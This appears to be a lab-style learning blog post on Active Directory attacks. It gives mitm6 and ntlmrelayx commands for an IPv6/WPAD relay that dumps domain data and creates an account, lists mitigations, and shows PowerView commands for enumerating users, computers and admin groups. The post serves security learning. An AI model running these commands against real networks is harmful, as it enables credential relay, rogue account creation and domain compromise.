---
title: Active Directory Attacks (Part 2)
date: 2023-10-20
categories: [Learning, Active Directory]
tags: [Active Directory, AD]
author: barabulkit
---

## IPv6 Attack

```shell
mitm6 -d arasaka.local
ntlmrelayx.py -6 -t ldaps://192.168.1.100 -wh fakewpad.arasaka.local -l lootme
```

This will gaher info about domain users and computers and store it on lottme folder, also will create user when it catches administator user logged into computer

### Mitigation

 - disable IPv6
 - if WPAD is not used disable it via Group Policy by disabling WinHttpAutoProxySvc
 - Relaying to LDAP and LDAPS mitigated by enabling both LDAP signing and channel binding
 - making Administrative usrs as `Account is sensitive and cannot be delegated`

## Post Compromise Enumeration Tools

### [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

 ```powershell
 Get-NetDomain
 ```
 ![GetNetDomain](/assets/img/acd/powerview/getnetdomain.png)

  ```powershell
 Get-NetDomainController
 ```
 ![GetNetDomainController](/assets/img/acd/powerview/getnetdomaincontroller.png)

 ```powershell
 Get-NetUser | select cn, logoncount
 ```
 ![ListUsers](/assets/img/acd/powerview/userlist.png)

```powershell
Get-NetComputer | select name
```
 ![ListComputers](/assets/img/acd/powerview/computerslist.png)

 ```powershell 
 Get-NetGroup | where -Property name -Like "*админ*" | select name
 ```
  ![AdminGroups](/assets/img/acd/powerview/getadmingroups.png)


```powershell
Get-NetGroupMember "администраторы домена" | select MemberName
```
  ![DomainAdmins](/assets/img/acd/powerview/getdomainadmins.png)